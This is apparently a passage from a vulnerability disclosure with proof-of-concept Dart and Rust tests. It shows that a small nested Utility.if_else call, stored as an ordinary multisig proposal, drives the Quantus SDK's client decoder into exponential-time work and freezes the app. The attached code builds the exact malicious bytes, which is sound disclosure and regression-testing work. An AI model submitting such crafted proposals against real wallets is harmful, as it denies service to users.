C76 scaling: depth=23 bytes=118 traversals=25165822 median_of_3=536331us per_traversal=21.3ns samples=534865,536331,536459
C76 scaling: depth=24 bytes=123 traversals=50331646 median_of_3=1076467us per_traversal=21.4ns samples=1069114,1076467,1077995
C76 scaling fit: fitted_from=18 points=7 slope=0.9998 r2=0.999988 ns_per_traversal=21.42 projected_depth=42 projected=3.3d
C76 acceptance: depth=100 bytes=503 traversals=3802951800684688204490109616126 watchdog=30s result=did-not-complete worker=terminated
```

A least-squares fit of `log2(median)` against depth over the seven converged points gives a slope of **0.9998** where the recurrence predicts 1.0, with **r² = 0.999988**. Per-traversal cost across those seven rows runs from 21.3 to 21.6 ns. The test asserts the slope and the r², and that the resulting projection exceeds one day; the exact figure is printed rather than asserted. A change to the growth rate therefore fails the test rather than producing a stale claim.

The projection uses the plateau rate rather than an extrapolated intercept, which is less sensitive to run-to-run noise. Taking the fastest rate observed, 21.3 ns:

| Depth   | Bytes   | Traversals                                    | Projected at 21.3 ns            |
| ------- | ------- | --------------------------------------------- | ------------------------------- |
| 24      | 123     | 50,331,646                                    | 1.07 s — measured               |
| 30      | 153     | 3,221,225,470                                 | 1.1 minutes                     |
| 42      | 213     | 13,194,139,533,310                            | 3.3 days                        |
| 50      | 253     | 3,377,699,720,527,870                         | 2 years                         |
| 64      | 323     | 55,340,232,221,128,654,846                    | 37,377 years                    |
| **100** | **503** | **3,802,951,800,684,688,204,490,109,616,126** | **2,568,584,264,161,081 years** |

Each level adds exactly 5 bytes and doubles the work; the encoding is `3 + 5 × depth` bytes.

The rate is the fastest measured on an AMD Ryzen 7 5800X (8 cores, 4.85 GHz boost) running the Dart VM on a desktop. It is a measurement on that host, not a mathematical floor.

### The depth-100 acceptance case

The last line of the run above is a separate case at depth 100 — 503 bytes, 5% of the runtime's call-size limit — put through the same production converter with a 30-second bound. It does not return, and the worker is terminated cleanly.

At the fastest rate measured, that input needs **2,568,584,264,161,081 years**, about **186,000 times the age of the universe**. The conversion did not return within the 30-second observation. Once the synchronous parsing begins, the UI isolate cannot service further frames or input.

### Result and limitations

Together, the layers connect a small, ordinary stored runtime call to the application's unbounded synchronous conversion. The client result is deliberately bounded: it proves exact bytes, non-completion at two seconds and clean worker termination; the exponential invocation count follows from the production-source recurrence shown in the Description. It does not claim a particular Android/iOS watchdog duration or process-termination policy. Production runs the same synchronous conversion on the application isolate and does not have the worker timeout or cleanup used solely to bound the regression test.

### Attached source files

<details>

<summary><code>poc_test.dart</code></summary>

```dart
import 'dart:async';
import 'dart:isolate';
import 'dart:typed_data';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/generated/planck/pallets/system.dart' as system_pallet;
import 'package:quantus_sdk/generated/planck/pallets/utility.dart' as utility_pallet;
import 'package:quantus_sdk/generated/planck/types/quantus_runtime/runtime_call.dart';
import 'package:quantus_sdk/src/chain/call_decoder.dart';

const _largeDepth = 42;
const _smallDepth = 16;
const _workerDeadline = Duration(seconds: 2);
const _controlDeadline = Duration(seconds: 20);
const _workerStartDeadline = Duration(seconds: 10);
const _workerExitDeadline = Duration(seconds: 10);

RuntimeCall _remark() => const system_pallet.Txs().remark(remark: []);

/// Builds a generated RuntimeCall whose `main` arm contains the previous layer.
RuntimeCall _mainNestedIfElse(int depth) {
  if (depth < 0) {
    throw RangeError.value(depth, 'depth', 'must be non-negative');
  }

  final leaf = _remark();
  RuntimeCall call = leaf;
  for (var level = 0; level < depth; level++) {
    call = const utility_pallet.Txs().ifElse(main: call, fallback: leaf);
  }
  return call;
}

/// Equal-size control whose recursive arm is visited only once by CallDecoder.
RuntimeCall _fallbackNestedIfElse(int depth) {
  if (depth < 0) {
    throw RangeError.value(depth, 'depth', 'must be non-negative');
  }

  final leaf = _remark();
  RuntimeCall call = leaf;
  for (var level = 0; level < depth; level++) {
    call = const utility_pallet.Txs().ifElse(main: leaf, fallback: call);
  }
  return call;
}

List<int> _canonicalMainEncoding(int depth) {
  List<int> bytes = const [0x00, 0x00, 0x00];
  for (var level = 0; level < depth; level++) {
    bytes = <int>[0x09, 0x06, ...bytes, 0x00, 0x00, 0x00];
  }
  return bytes;
}

List<int> _canonicalFallbackEncoding(int depth) {
  List<int> bytes = const [0x00, 0x00, 0x00];
  for (var level = 0; level < depth; level++) {
    bytes = <int>[0x09, 0x06, 0x00, 0x00, 0x00, ...bytes];
  }
  return bytes;
}

BigInt _mainTraversalCount(int depth) => BigInt.from(3) * (BigInt.one << depth) - BigInt.from(2);

int _fallbackTraversalCount(int depth) => 3 * depth + 1;

class _DecodeOutcome {
  const _DecodeOutcome.completed({required this.elapsed, required this.pallet, required this.call}) : timedOut = false;

  const _DecodeOutcome.timedOut({required this.elapsed}) : timedOut = true, pallet = null, call = null;

  final bool timedOut;
  final Duration elapsed;
  final String? pallet;
  final String? call;
}

/// Runs the production bytes-to-display conversion away from the test isolate.
///
/// The worker reports that it has entered immediately before decode starts. The
/// parent starts its deadline only after that message, and the `finally` block
/// always terminates the worker and confirms receipt of its exit notification.
Future<_DecodeOutcome> _decodeWithWatchdog(Uint8List bytes, Duration deadline) async {
  final startedPort = ReceivePort();
  final resultPort = ReceivePort();
  final exitPort = ReceivePort();
  Isolate? worker;
  _DecodeOutcome? outcome;

  try {
    worker = await Isolate.spawn<List<Object>>(
      _decodeWorker,
      <Object>[startedPort.sendPort, resultPort.sendPort, bytes],
      debugName: 'c76-call-decoder-worker',
      errorsAreFatal: true,
      onError: resultPort.sendPort,
      onExit: exitPort.sendPort,
    );

    await startedPort.first.timeout(_workerStartDeadline);
    final stopwatch = Stopwatch()..start();
    try {
      final rawResult = await resultPort.first.timeout(deadline);
      stopwatch.stop();
      if (rawResult is! Map<Object?, Object?> || rawResult['event'] != 'completed') {
        throw StateError('worker failed before completing decode: $rawResult');
      }
      outcome = _DecodeOutcome.completed(
        elapsed: stopwatch.elapsed,
        pallet: rawResult['pallet'] as String,
        call: rawResult['call'] as String,
      );
    } on TimeoutException {
      stopwatch.stop();
      outcome = _DecodeOutcome.timedOut(elapsed: stopwatch.elapsed);
    }
  } finally {
    worker?.kill(priority: Isolate.immediate);
    if (worker != null) {
      await exitPort.first.timeout(
        _workerExitDeadline,
        onTimeout: () => throw StateError('worker did not confirm exit after kill'),
      );
    }
    startedPort.close();
    resultPort.close();
    exitPort.close();
  }

  return outcome;
}

@pragma('vm:entry-point')
void _decodeWorker(List<Object> message) {
  final startedPort = message[0] as SendPort;
  final resultPort = message[1] as SendPort;
  final bytes = message[2] as Uint8List;

  startedPort.send('started');
  try {
    final decoded = CallDecoder.decodeBytes(bytes);
    resultPort.send(<String, Object>{'event': 'completed', 'pallet': decoded.pallet, 'call': decoded.call});
  } catch (error, stackTrace) {
    resultPort.send(<String, Object>{'event': 'error', 'error': '$error', 'stackTrace': '$stackTrace'});
  }
}

void main() {
  group('Utility.if_else decoder availability regression', () {
    test('generated depth-42 calls have the exact canonical 213-byte encodings', () {
      final mainNested = _mainNestedIfElse(_largeDepth).encode();
      final fallbackNested = _fallbackNestedIfElse(_largeDepth).encode();

      expect(mainNested, hasLength(3 + 5 * _largeDepth));
      expect(fallbackNested, hasLength(mainNested.length));
      expect(mainNested, orderedEquals(_canonicalMainEncoding(_largeDepth)));
      expect(fallbackNested, orderedEquals(_canonicalFallbackEncoding(_largeDepth)));
      expect(_mainTraversalCount(_largeDepth), BigInt.parse('13194139533310'));
      expect(_fallbackTraversalCount(_largeDepth), 127);
    });

    test('same-size depth-42 fallback nesting completes within the control deadline', () async {
      final bytes = _fallbackNestedIfElse(_largeDepth).encode();
      final outcome = await _decodeWithWatchdog(bytes, _controlDeadline);

      expect(outcome.timedOut, isFalse);
      expect(outcome.pallet, 'Utility');
      expect(outcome.call, 'if_else');
      debugPrint(
        'C76 linear control: depth=$_largeDepth bytes=${bytes.length} '
        'traversals=${_fallbackTraversalCount(_largeDepth)} completed_in=${outcome.elapsed.inMicroseconds}us',
      );
    });

    test('smaller depth-16 main nesting completes through the same production decoder', () async {
      final bytes = _mainNestedIfElse(_smallDepth).encode();
      final outcome = await _decodeWithWatchdog(bytes, _controlDeadline);

      expect(bytes, hasLength(3 + 5 * _smallDepth));
      expect(bytes, orderedEquals(_canonicalMainEncoding(_smallDepth)));
      expect(_mainTraversalCount(_smallDepth), BigInt.from(196606));
      expect(outcome.timedOut, isFalse);
      expect(outcome.pallet, 'Utility');
      expect(outcome.call, 'if_else');
      debugPrint(
        'C76 bounded main control: depth=$_smallDepth bytes=${bytes.length} '
        'traversals=${_mainTraversalCount(_smallDepth)} completed_in=${outcome.elapsed.inMicroseconds}us',
      );
    });

    test('depth-42 main nesting reaches the bounded watchdog deadline', () async {
      final bytes = _mainNestedIfElse(_largeDepth).encode();
      final outcome = await _decodeWithWatchdog(bytes, _workerDeadline);

      expect(bytes, hasLength(213));
      expect(outcome.timedOut, isTrue);
      debugPrint(
        'C76 bounded observation: depth=$_largeDepth bytes=${bytes.length} '
        'traversals=${_mainTraversalCount(_largeDepth)} '
        'watchdog=${_workerDeadline.inMilliseconds}ms result=timeout worker=terminated',
      );
    });
  });
}
```

</details>

<details>

<summary><code>runtime-harness.patch</code></summary>

```diff
diff --git a/runtime/tests/transactions/c76_if_else_runtime.rs b/runtime/tests/transactions/c76_if_else_runtime.rs
new file mode 100644
index 0000000..1806eec
--- /dev/null
+++ b/runtime/tests/transactions/c76_if_else_runtime.rs
@@ -0,0 +1,224 @@
+//! Frozen-runtime acceptance fixture for the C76 client-side decoder regression.
+//!
+//! This test deliberately does not run the client decoder. It establishes that
+//! the exact depth-42 call used by the client-side fixture is a small, ordinary
+//! RuntimeCall which the frozen runtime can decode, weigh, and store as an active
+//! proposal in a normal multisig.
+
+#[cfg(test)]
+mod tests {
+    use crate::common::TestCommons;
+    use codec::{Decode, Encode};
+    use frame_support::{
+        assert_ok,
+        dispatch::GetDispatchInfo,
+        traits::{Currency, Get},
+        weights::Weight,
+    };
+    use pallet_multisig::{BoundedCallOf, ProposalStatus};
+    use quantus_runtime::{Balances, Multisig, Runtime, RuntimeCall, RuntimeOrigin, System, UNIT};
+
+    const DEPTH: usize = 42;
+    const EXPECTED_BYTES: usize = 3 + 5 * DEPTH;
+    const EXPECTED_RUNTIME_NODES: usize = 2 * DEPTH + 1;
+    const PROJECTED_CLIENT_VISITS: u64 = 3 * (1u64 << DEPTH) - 2;
+
+    fn empty_remark() -> RuntimeCall {
+        RuntimeCall::System(frame_system::Call::remark { remark: Vec::new() })
+    }
+
+    fn typed_depth_42_call() -> RuntimeCall {
+        let mut call = empty_remark();
+        for _ in 0..DEPTH {
+            call = RuntimeCall::Utility(pallet_utility::Call::if_else {
+                main: Box::new(call),
+                fallback: Box::new(empty_remark()),
+            });
+        }
+        call
+    }
+
+    fn independent_scale_fixture() -> Vec<u8> {
+        independent_scale_fixture_at(DEPTH)
+    }
+
+    /// The same construction for any depth, built from raw call indices rather
+    /// than from the typed variants, so the two are independent of each other.
+    fn independent_scale_fixture_at(depth: usize) -> Vec<u8> {
+        let mut bytes = Vec::with_capacity(3 + 5 * depth);
+
+        // RuntimeCall::Utility (9), Utility::if_else (6), repeated along main.
+        for _ in 0..depth {
+            bytes.extend_from_slice(&[9, 6]);
+        }
+
+        // F(0) plus one empty fallback per if_else layer. Each empty
+        // System.remark is [RuntimeCall::System (0), remark (0), Vec length (0)].
+        for _ in 0..=depth {
+            bytes.extend_from_slice(&[0, 0, 0]);
+        }
+
+        bytes
+    }
+
+    fn assert_empty_remark(call: &RuntimeCall) {
+        match call {
+            RuntimeCall::System(frame_system::Call::remark { remark }) => {
+                assert!(remark.is_empty(), "remark fixture must be empty");
+            }
+            _ => panic!("expected an empty System.remark"),
+        }
+    }
+
+    fn assert_main_nested_shape(call: &RuntimeCall, remaining: usize) {
+        if remaining == 0 {
+            assert_empty_remark(call);
+            return;
+        }
+
+        match call {
+            RuntimeCall::Utility(pallet_utility::Call::if_else { main, fallback }) => {
+                assert_empty_remark(fallback.as_ref());
+                assert_main_nested_shape(main.as_ref(), remaining - 1);
+            }
+            _ => panic!("expected Utility.if_else at nesting level {remaining}"),
+        }
+    }
+
+    #[test]
+    fn depth_42_if_else_is_a_storable_normal_multisig_call() {
+        TestCommons::new_test_ext().execute_with(|| {
+			System::set_block_number(1);
+
+			let typed = typed_depth_42_call();
+			let call_bytes = independent_scale_fixture();
+			assert_eq!(call_bytes.len(), EXPECTED_BYTES);
+			assert_eq!(call_bytes.len(), 213);
+			assert_eq!(typed.encode(), call_bytes, "typed Rust and independent SCALE fixtures differ");
+
+			let mut input = &call_bytes[..];
+			let decoded = RuntimeCall::decode(&mut input).expect("depth-42 fixture must decode");
+			assert!(input.is_empty(), "fixture must not contain trailing bytes");
+			assert_eq!(decoded.encode(), call_bytes, "runtime decode must round-trip exactly");
+			assert_main_nested_shape(&decoded, DEPTH);
+
+			let call_weight = decoded.get_dispatch_info().call_weight;
+			let max_inner_weight =
+				<<Runtime as pallet_multisig::Config>::MaxInnerCallWeight as Get<Weight>>::get();
+			assert!(
+				!call_weight.any_gt(max_inner_weight),
+				"depth-42 call weight {call_weight:?} must fit MaxInnerCallWeight {max_inner_weight:?}",
+			);
+
+			let max_call_size =
+				<<Runtime as pallet_multisig::Config>::MaxCallSize as Get<u32>>::get() as usize;
+			assert!(call_bytes.len() < max_call_size);
+			let bounded: BoundedCallOf<Runtime> =
+				call_bytes.clone().try_into().expect("213 bytes must fit MaxCallSize");
+
+			let signer_a = TestCommons::account_id(1);
+			let signer_b = TestCommons::account_id(2);
+			let signers = vec![signer_a.clone(), signer_b.clone()];
+			assert_ok!(Multisig::create_multisig(
+				RuntimeOrigin::signed(signer_a.clone()),
+				signers.clone(),
+				2,
+				0,
+			));
+			let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
+			Balances::make_free_balance_be(&multisig, 10 * UNIT);
+
+			assert_ok!(Multisig::propose(
+				RuntimeOrigin::signed(signer_a.clone()),
+				multisig.clone(),
+				bounded,
+				100,
+			));
+
+			let stored = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
+				.expect("proposal must be stored");
+			assert_eq!(stored.call.as_slice(), call_bytes.as_slice());
+			assert_eq!(stored.status, ProposalStatus::Active);
+			assert_eq!(stored.approvals.as_slice(), &[signer_a]);
+
+			println!(
+				"depth={DEPTH} bytes={} runtime_nodes={EXPECTED_RUNTIME_NODES} projected_client_visits={PROJECTED_CLIENT_VISITS} call_weight={call_weight:?} max_inner_weight={max_inner_weight:?} max_call_size={max_call_size} stored_status={:?}",
+				call_bytes.len(),
+				stored.status,
+			);
+		});
+    }
+
+    /// The client-side argument quotes depth 100. This checks that depth 100 is
+    /// equally storable: it builds the call, prints both gates, and stores it.
+    #[test]
+    fn depth_100_if_else_is_also_a_storable_normal_multisig_call() {
+        const D: usize = 100;
+        TestCommons::new_test_ext().execute_with(|| {
+            let mut call = empty_remark();
+            for _ in 0..D {
+                call = RuntimeCall::Utility(pallet_utility::Call::if_else {
+                    main: Box::new(call),
+                    fallback: Box::new(empty_remark()),
+                });
+            }
+            let call_bytes = independent_scale_fixture_at(D);
+            assert_eq!(call_bytes.len(), 3 + 5 * D);
+            assert_eq!(call.encode(), call_bytes, "typed Rust and independent SCALE fixtures differ");
+
+            let mut input = &call_bytes[..];
+            let decoded = RuntimeCall::decode(&mut input).expect("depth-100 fixture must decode");
+            assert!(input.is_empty(), "fixture must not contain trailing bytes");
+            assert_eq!(decoded.encode(), call_bytes, "runtime decode must round-trip exactly");
+            assert_main_nested_shape(&decoded, D);
+
+            let call_weight = decoded.get_dispatch_info().call_weight;
+            let max_inner_weight =
+                <<Runtime as pallet_multisig::Config>::MaxInnerCallWeight as Get<Weight>>::get();
+            let max_call_size =
+                <<Runtime as pallet_multisig::Config>::MaxCallSize as Get<u32>>::get() as usize;
+
+            println!(
+                "depth={D} bytes={} call_weight={call_weight:?} \
+max_inner_weight={max_inner_weight:?} max_call_size={max_call_size}",
+                call_bytes.len(),
+            );
+
+            assert!(!call_weight.any_gt(max_inner_weight));
+            assert!(call_bytes.len() < max_call_size);
+
+            let signer_a = TestCommons::account_id(1);
+            let signer_b = TestCommons::account_id(2);
+            let signers = vec![signer_a.clone(), signer_b.clone()];
+            assert_ok!(Multisig::create_multisig(
+                RuntimeOrigin::signed(signer_a.clone()),
+                signers.clone(),
+                2,
+                0,
+            ));
+            let multisig_id = Multisig::derive_multisig_address(&signers, 2, 0);
+            Balances::make_free_balance_be(&multisig_id, 10 * UNIT);
+
+            let bounded: BoundedCallOf<Runtime> = call_bytes
+                .clone()
+                .try_into()
+                .expect("503 bytes must fit MaxCallSize");
+            assert_ok!(Multisig::propose(
+                RuntimeOrigin::signed(signer_a.clone()),
+                multisig_id.clone(),
+                bounded,
+                100,
+            ));
+            let stored = pallet_multisig::Proposals::<Runtime>::iter_prefix_values(&multisig_id)
+                .next()
+                .expect("proposal must be stored");
+            assert_eq!(
+                stored.call.to_vec(),
+                call_bytes,
+                "stored bytes must be identical"
+            );
+            println!("depth={D} stored_status={:?}", stored.status);
+            assert_eq!(stored.status, ProposalStatus::Active);
+        });
+    }
+}
diff --git a/runtime/tests/transactions/mod.rs b/runtime/tests/transactions/mod.rs
index 00c1d89..d73941b 100644
--- a/runtime/tests/transactions/mod.rs
+++ b/runtime/tests/transactions/mod.rs
@@ -1,3 +1,4 @@
+pub mod c76_if_else_runtime;
 pub mod integration;
 pub mod ml_dsa_65;
 pub mod recovery;
```

</details>

<details>

<summary><code>runtime_test.rs</code></summary>

```rs
//! Frozen-runtime acceptance fixture for the C76 client-side decoder regression.
//!
//! This test deliberately does not run the client decoder. It establishes that
//! the exact depth-42 call used by the client-side fixture is a small, ordinary
//! RuntimeCall which the frozen runtime can decode, weigh, and store as an active
//! proposal in a normal multisig.

#[cfg(test)]
mod tests {
    use crate::common::TestCommons;
    use codec::{Decode, Encode};
    use frame_support::{
        assert_ok,
        dispatch::GetDispatchInfo,
        traits::{Currency, Get},
        weights::Weight,
    };
    use pallet_multisig::{BoundedCallOf, ProposalStatus};
    use quantus_runtime::{Balances, Multisig, Runtime, RuntimeCall, RuntimeOrigin, System, UNIT};

    const DEPTH: usize = 42;
    const EXPECTED_BYTES: usize = 3 + 5 * DEPTH;
    const EXPECTED_RUNTIME_NODES: usize = 2 * DEPTH + 1;
    const PROJECTED_CLIENT_VISITS: u64 = 3 * (1u64 << DEPTH) - 2;

    fn empty_remark() -> RuntimeCall {
        RuntimeCall::System(frame_system::Call::remark { remark: Vec::new() })
    }

    fn typed_depth_42_call() -> RuntimeCall {
        let mut call = empty_remark();
        for _ in 0..DEPTH {
            call = RuntimeCall::Utility(pallet_utility::Call::if_else {
                main: Box::new(call),
                fallback: Box::new(empty_remark()),
            });
        }
        call
    }

    fn independent_scale_fixture() -> Vec<u8> {
        independent_scale_fixture_at(DEPTH)
    }

    /// The same construction for any depth, built from raw call indices rather
    /// than from the typed variants, so the two are independent of each other.
    fn independent_scale_fixture_at(depth: usize) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(3 + 5 * depth);

        // RuntimeCall::Utility (9), Utility::if_else (6), repeated along main.
        for _ in 0..depth {
            bytes.extend_from_slice(&[9, 6]);
        }

        // F(0) plus one empty fallback per if_else layer. Each empty
        // System.remark is [RuntimeCall::System (0), remark (0), Vec length (0)].
        for _ in 0..=depth {
            bytes.extend_from_slice(&[0, 0, 0]);
        }

        bytes
    }

    fn assert_empty_remark(call: &RuntimeCall) {
        match call {
            RuntimeCall::System(frame_system::Call::remark { remark }) => {
                assert!(remark.is_empty(), "remark fixture must be empty");
            }
            _ => panic!("expected an empty System.remark"),
        }
    }

    fn assert_main_nested_shape(call: &RuntimeCall, remaining: usize) {
        if remaining == 0 {
            assert_empty_remark(call);
            return;
        }

        match call {
            RuntimeCall::Utility(pallet_utility::Call::if_else { main, fallback }) => {
                assert_empty_remark(fallback.as_ref());
                assert_main_nested_shape(main.as_ref(), remaining - 1);
            }
            _ => panic!("expected Utility.if_else at nesting level {remaining}"),
        }
    }

    #[test]
    fn depth_42_if_else_is_a_storable_normal_multisig_call() {
        TestCommons::new_test_ext().execute_with(|| {
			System::set_block_number(1);

			let typed = typed_depth_42_call();
			let call_bytes = independent_scale_fixture();
			assert_eq!(call_bytes.len(), EXPECTED_BYTES);
			assert_eq!(call_bytes.len(), 213);
			assert_eq!(typed.encode(), call_bytes, "typed Rust and independent SCALE fixtures differ");

			let mut input = &call_bytes[..];
			let decoded = RuntimeCall::decode(&mut input).expect("depth-42 fixture must decode");
			assert!(input.is_empty(), "fixture must not contain trailing bytes");
			assert_eq!(decoded.encode(), call_bytes, "runtime decode must round-trip exactly");
			assert_main_nested_shape(&decoded, DEPTH);

			let call_weight = decoded.get_dispatch_info().call_weight;
			let max_inner_weight =
				<<Runtime as pallet_multisig::Config>::MaxInnerCallWeight as Get<Weight>>::get();
			assert!(
				!call_weight.any_gt(max_inner_weight),
				"depth-42 call weight {call_weight:?} must fit MaxInnerCallWeight {max_inner_weight:?}",
			);

			let max_call_size =
				<<Runtime as pallet_multisig::Config>::MaxCallSize as Get<u32>>::get() as usize;
			assert!(call_bytes.len() < max_call_size);
			let bounded: BoundedCallOf<Runtime> =
				call_bytes.clone().try_into().expect("213 bytes must fit MaxCallSize");

			let signer_a = TestCommons::account_id(1);
			let signer_b = TestCommons::account_id(2);
			let signers = vec![signer_a.clone(), signer_b.clone()];
			assert_ok!(Multisig::create_multisig(
				RuntimeOrigin::signed(signer_a.clone()),
				signers.clone(),
				2,
				0,
			));
			let multisig = Multisig::derive_multisig_address(&signers, 2, 0);
			Balances::make_free_balance_be(&multisig, 10 * UNIT);

			assert_ok!(Multisig::propose(
				RuntimeOrigin::signed(signer_a.clone()),
				multisig.clone(),
				bounded,
				100,
			));

			let stored = pallet_multisig::Proposals::<Runtime>::get(&multisig, 0)
				.expect("proposal must be stored");
			assert_eq!(stored.call.as_slice(), call_bytes.as_slice());
			assert_eq!(stored.status, ProposalStatus::Active);
			assert_eq!(stored.approvals.as_slice(), &[signer_a]);

			println!(
				"depth={DEPTH} bytes={} runtime_nodes={EXPECTED_RUNTIME_NODES} projected_client_visits={PROJECTED_CLIENT_VISITS} call_weight={call_weight:?} max_inner_weight={max_inner_weight:?} max_call_size={max_call_size} stored_status={:?}",
				call_bytes.len(),
				stored.status,
			);
		});
    }

    /// The client-side argument quotes depth 100. This checks that depth 100 is
    /// equally storable: it builds the call, prints both gates, and stores it.
    #[test]
    fn depth_100_if_else_is_also_a_storable_normal_multisig_call() {
        const D: usize = 100;
        TestCommons::new_test_ext().execute_with(|| {
            let mut call = empty_remark();
            for _ in 0..D {
                call = RuntimeCall::Utility(pallet_utility::Call::if_else {
                    main: Box::new(call),
                    fallback: Box::new(empty_remark()),
                });
            }
            let call_bytes = independent_scale_fixture_at(D);
            assert_eq!(call_bytes.len(), 3 + 5 * D);
            assert_eq!(call.encode(), call_bytes, "typed Rust and independent SCALE fixtures differ");

            let mut input = &call_bytes[..];
            let decoded = RuntimeCall::decode(&mut input).expect("depth-100 fixture must decode");
            assert!(input.is_empty(), "fixture must not contain trailing bytes");
            assert_eq!(decoded.encode(), call_bytes, "runtime decode must round-trip exactly");
            assert_main_nested_shape(&decoded, D);

            let call_weight = decoded.get_dispatch_info().call_weight;
            let max_inner_weight =
                <<Runtime as pallet_multisig::Config>::MaxInnerCallWeight as Get<Weight>>::get();
            let max_call_size =
                <<Runtime as pallet_multisig::Config>::MaxCallSize as Get<u32>>::get() as usize;

            println!(
                "depth={D} bytes={} call_weight={call_weight:?} \
max_inner_weight={max_inner_weight:?} max_call_size={max_call_size}",
                call_bytes.len(),
            );

            assert!(!call_weight.any_gt(max_inner_weight));
            assert!(call_bytes.len() < max_call_size);

            let signer_a = TestCommons::account_id(1);
            let signer_b = TestCommons::account_id(2);
            let signers = vec![signer_a.clone(), signer_b.clone()];
            assert_ok!(Multisig::create_multisig(
                RuntimeOrigin::signed(signer_a.clone()),
                signers.clone(),
                2,
                0,
            ));
            let multisig_id = Multisig::derive_multisig_address(&signers, 2, 0);
            Balances::make_free_balance_be(&multisig_id, 10 * UNIT);

            let bounded: BoundedCallOf<Runtime> = call_bytes
                .clone()
                .try_into()
                .expect("503 bytes must fit MaxCallSize");
            assert_ok!(Multisig::propose(
                RuntimeOrigin::signed(signer_a.clone()),
                multisig_id.clone(),
                bounded,
                100,
            ));
            let stored = pallet_multisig::Proposals::<Runtime>::iter_prefix_values(&multisig_id)
                .next()
                .expect("proposal must be stored");
            assert_eq!(
                stored.call.to_vec(),
                call_bytes,
                "stored bytes must be identical"
            );
            println!("depth={D} stored_status={:?}", stored.status);
            assert_eq!(stored.status, ProposalStatus::Active);
        });
    }
}
```

</details>

<details>

<summary><code>scaling_test.dart</code> — measured 16..24 sweep and the fit behind the projection</summary>

```dart
// C76 — measured scaling of the Utility.if_else display conversion.
//
// The main regression (poc_test.dart) measures one completing depth and one
// non-completing depth. This file instead sweeps a range that all complete,
// so the growth rate is fitted from measurements rather than assumed, and the
// depth-42 figure quoted in the report follows from that fit.
//
// Every decode runs the frozen production converter, CallDecoder.decodeBytes,
// on a worker isolate that is always terminated in a finally block. Nothing
// here touches a network, a node or any account.

import 'dart:async';
import 'dart:isolate';
import 'dart:math' as math;
import 'dart:typed_data';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/generated/planck/pallets/system.dart' as system_pallet;
import 'package:quantus_sdk/generated/planck/pallets/utility.dart' as utility_pallet;
import 'package:quantus_sdk/generated/planck/types/quantus_runtime/runtime_call.dart';
import 'package:quantus_sdk/src/chain/call_decoder.dart';

const _sweepStart = 16;
// Below this depth the measurement is dominated by fixed per-run cost and JIT
// warm-up rather than by the traversal itself, so the fit starts here.
const _fitFrom = 18;
const _sweepEnd = 24;
const _repeats = 3;
const _reportedDepth = 42;
const _acceptanceDepth = 100;
const _acceptanceDeadline = Duration(seconds: 30);
const _warmupDepth = 12;
const _perDepthDeadline = Duration(seconds: 120);
const _workerStartDeadline = Duration(seconds: 10);
const _workerExitDeadline = Duration(seconds: 10);

RuntimeCall _remark() => const system_pallet.Txs().remark(remark: []);

/// The canonical encoding, built independently of the generated codec so the
/// acceptance test asserts the bytes rather than trusting the builder.
List<int> _canonicalMainEncoding(int depth) {
  List<int> bytes = const [0x00, 0x00, 0x00];
  for (var level = 0; level < depth; level++) {
    bytes = <int>[0x09, 0x06, ...bytes, 0x00, 0x00, 0x00];
  }
  return bytes;
}

RuntimeCall _mainNestedIfElse(int depth) {
  final leaf = _remark();
  RuntimeCall call = leaf;
  for (var level = 0; level < depth; level++) {
    call = const utility_pallet.Txs().ifElse(main: call, fallback: leaf);
  }
  return call;
}

/// 3 * 2^depth - 2 — one describe() per node, with `main` described twice.
BigInt _mainTraversalCount(int depth) => BigInt.from(3) * (BigInt.one << depth) - BigInt.from(2);

Uint8List _encode(int depth) => Uint8List.fromList(RuntimeCall.codec.encode(_mainNestedIfElse(depth)));

/// Returns null when the decode did not complete before [deadline].
Future<Duration?> _decodeOrTimeout(Uint8List bytes, Duration deadline) async {
  final startedPort = ReceivePort();
  final resultPort = ReceivePort();
  final exitPort = ReceivePort();
  Isolate? worker;
  Duration? completedIn;

  try {
    worker = await Isolate.spawn<List<Object>>(
      _decodeWorker,
      <Object>[startedPort.sendPort, resultPort.sendPort, bytes],
      debugName: 'c76-acceptance-worker',
      errorsAreFatal: true,
      onError: resultPort.sendPort,
      onExit: exitPort.sendPort,
    );

    await startedPort.first.timeout(_workerStartDeadline);
    final stopwatch = Stopwatch()..start();
    try {
      final raw = await resultPort.first.timeout(deadline);
      stopwatch.stop();
      if (raw is! Map<Object?, Object?> || raw['event'] != 'completed') {
        throw StateError('worker failed before completing decode: $raw');
      }
      completedIn = stopwatch.elapsed;
    } on TimeoutException {
      completedIn = null;
    }
  } finally {
    worker?.kill(priority: Isolate.immediate);
    if (worker != null) {
      await exitPort.first.timeout(
        _workerExitDeadline,
        onTimeout: () => throw StateError('worker did not confirm exit after kill'),
      );
    }
    startedPort.close();
    resultPort.close();
    exitPort.close();
  }

  return completedIn;
}

Future<Duration> _timeDecode(Uint8List bytes) async {
  final startedPort = ReceivePort();
  final resultPort = ReceivePort();
  final exitPort = ReceivePort();
  Isolate? worker;
  Duration? elapsed;

  try {
    worker = await Isolate.spawn<List<Object>>(
      _decodeWorker,
      <Object>[startedPort.sendPort, resultPort.sendPort, bytes],
      debugName: 'c76-scaling-worker',
      errorsAreFatal: true,
      onError: resultPort.sendPort,
      onExit: exitPort.sendPort,
    );

    await startedPort.first.timeout(_workerStartDeadline);
    final stopwatch = Stopwatch()..start();
    final raw = await resultPort.first.timeout(_perDepthDeadline);
    stopwatch.stop();
    if (raw is! Map<Object?, Object?> || raw['event'] != 'completed') {
      throw StateError('worker failed before completing decode: $raw');
    }
    elapsed = stopwatch.elapsed;
  } finally {
    worker?.kill(priority: Isolate.immediate);
    if (worker != null) {
      await exitPort.first.timeout(
        _workerExitDeadline,
        onTimeout: () => throw StateError('worker did not confirm exit after kill'),
      );
    }
    startedPort.close();
    resultPort.close();
    exitPort.close();
  }

  return elapsed;
}

@pragma('vm:entry-point')
void _decodeWorker(List<Object> message) {
  final startedPort = message[0] as SendPort;
  final resultPort = message[1] as SendPort;
  final bytes = message[2] as Uint8List;

  startedPort.send('started');
  try {
    final decoded = CallDecoder.decodeBytes(bytes);
    resultPort.send(<String, Object>{'event': 'completed', 'pallet': decoded.pallet, 'call': decoded.call});
  } catch (error, stackTrace) {
    resultPort.send(<String, Object>{'event': 'error', 'error': '$error', 'stackTrace': '$stackTrace'});
  }
}

